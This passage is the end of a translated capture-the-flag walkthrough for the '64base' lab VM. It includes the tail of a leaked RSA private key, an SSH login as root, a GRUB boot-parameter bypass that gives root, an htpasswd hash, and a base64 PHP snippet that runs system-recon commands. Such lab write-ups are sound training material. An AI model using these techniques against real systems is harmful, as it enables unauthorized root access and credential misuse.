<br><br>  mDtRxIwh40RSNAs2 + lNRHvS9yhM + eaxxU5yrGPCkrbQW / RgPP + RGJBz9VrTkvYw6 <br>  YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz <br>  8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel + 6HGObF8Zh3MIchy8s1XrE0 <br>  kvLKI252mzWw4kbSs9 + QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse <br>  MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4 + zhu6jOWYH <br>  k2hdCHNSt + iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob <br>  wXRf5BcGKU97xdorV2Tq + h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx + 98K8KpWL <br>  guJPRPKGijo96HDGc3L5YsxObVg + / fj0AvsKfrcV / lxaW + Imymc1MXiJMbmCzlDw <br>  TAWmaqkRFDyA1HUvtvSeVqS1 / HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd <br>  2d3G + Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv <br>  AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG <br>  4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW + GkN9L + 9CPy8 + DNunFIwx <br>  + T ++ 7Qg / uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs <br>  fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi <br>  + j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19 + Me8JEhQ8KNXDwQKDyULFOTsz <br>  13VfBNxYsyL5zGXNzyqZ4I / OO7Med2j0Gz0g21iHA / 06mrs2clds6SUBGEvn8NiV <br>  rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy / e10F745xDMATKRlKZ6rYHMCxJ3Icnt <br>  Ez0OMXYdC6CiF / IWtgdU + hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE <br>  Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X / ReF / AaMxkbSdEOFsI <br>  Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG <br>  Yiaa5o7877 / fw6YZ / 2U3ADdiSOBm + hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj <br>  qJanSk8175z0bjrXWdLG3DSlIJislPW + yDaf7YBVYwWR + TA1kC6ieIA5tU3pn / I3 <br>  64Z5mpC + wqfTxGgeCsgIk9vSn2p / eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v + P <br>  fnHLQvEwIs + Bf1CpK1AkZeUMREQkBhDi72HFbw2G / zqti / YdnqxAyl6LZzIeQn8t <br>  / Gj4karJ1iM9If39dM5OaCVZR / TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP <br>  ----- END RSA PRIVATE KEY ----- <br></div></div><br>  We use it to connect via ssh <br><br><pre> <code class="bash hljs">ssh root@192.168.1.2 -p 62964 -i key.rsa</code> </pre> <br>  The password as it is easy to guess is written in the picture, after successful connection we get the last flag: <br><blockquote>  flag6 {NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1N <br>  GU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU <br>  0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5 <br>  MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0 <br>  ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNj <br>  M3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK} </blockquote><br>  In which the command is encoded: <i>base64 -d /var/local/.luke|less.real</i> <br>  And root access to the virtual machine.  Task completed! <br><br>  <b>PS</b> There is at least 1 more way to go through this lab. <br><br><div class="spoiler">  <b class="spoiler_title">Dirty hack</b> <div class="spoiler_text">  Immediately after loading the image in VirtualBox, an authorization request appears.  During the download, you can see that GRUB is used, so we reboot, wait for the OS selection menu to appear, and change the boot options: <br><img src="https://habrastorage.org/files/10f/a40/bdc/10fa40bdcd0b417ea03f33ab62341e74.png"><br><br>  Boot and get root.  Looking around in the system, go to the site directory. <br>  Running the command: <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /var/www/html ls -l | wc -l</code> </pre> <br>  Get the number of items in this directory, they turned 443. We still need the <i>admin</i> directory.  After reviewing its contents in the folder S3cR37 we find the second flag <br><br><img src="https://habrastorage.org/files/7f2/b1e/37f/7f2b1e37f36a4bc298c1d9211c055430.png"><br><br>  Here we can find the password hash for this directory and the username: <br>  <i>64base: $ apr1 $ SNPbKyA8 $ 0.2pIMdx4JVVA6jsX / Ru30</i> <br><br><img src="https://habrastorage.org/files/ed4/c55/2be/ed4c552be5074943a87662242dbf5b7e.png"><br><br>  Look at the contents of the index.html file, and get the first flag.  Execute the command: <br><br><pre> <code class="bash hljs">grep -r flag3 /var/www/</code> </pre> <br>  And we find the third flag <br><br><img src="https://habrastorage.org/files/510/03c/dae/51003cdae08c4adfadb3cddba673958f.png"><br><br>  Similarly, we find the fifth and sixth flags: <br><br><pre> <code class="bash hljs">root@64base:~<span class="hljs-comment"><span class="hljs-comment"># find /var/www/html/ -name flag*</span></span></code> </pre> <br><blockquote>  / var / www / html / admin / S3cR37 / flag5 {TG9vayBJbnNpZGUhIDpECg ==} </blockquote><br><pre> <code class="bash hljs">root@64base:~<span class="hljs-comment"><span class="hljs-comment"># grep -r flag6 /</span></span></code> </pre> <br><blockquote>  /root/.profile:echo ¬´flag6 {NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}¬ª </blockquote><br>  Well, from the file <i>/var/www/html/Imperial-Class/BountyHunter/login.php we</i> extract and decode the fourth flag: <br><br><blockquote>  $ _U = base64_decode ( 'ZWNobyAnPGg0PmZsYWc0e05qUmlZWE5sT2pZMFltRnpaVFZvTXpjM0NnPT19PC9oND4nO2NhdC5yZWFsIC9ldGMvaXNzdWU7ZGF0ZTt1bmFtZSAtYTsvc2Jpbi9pZmNvbmZpZyBldGgwfC91c3Ivc2hhcmUvZ3JlcC5yZWFsIGluZXQ7ZWNobwo ='). '  '. $ _ s; </blockquote><br></div></div></div><p>Source: <a href="https://habr.com/ru/post/317346/">https://habr.com/ru/post/317346/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317334/index.html">The digest of interesting materials for the mobile # 183 developer (December 5-11)</a></li>
<li><a href="../317336/index.html">Scrapbook with M * CTF</a></li>
<li><a href="../317338/index.html">Set up Swashbuckle (Swagger) for WebAPI</a></li>
<li><a href="../317340/index.html">How I chose the GTD system for IT using the Wunderlist example</a></li>
<li><a href="../317344/index.html">Adizes PAEI Management Styles and Scrum Roles</a></li>
<li><a href="../317348/index.html">Parallel fast sorting on Haskell and how hard it turned out to write</a></li>
<li><a href="../317350/index.html">Presentations and video presentations from the VR-Today virtual reality meeting</a></li>
<li><a href="../317354/index.html">OpenWRT + OpenVPN: point bypass blocking</a></li>
<li><a href="../317356/index.html">Automatic backup of virtual machines in XenServer</a></li>
<li><a href="../317360/index.html">$ mol_atom: theory and practice of reactivity</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>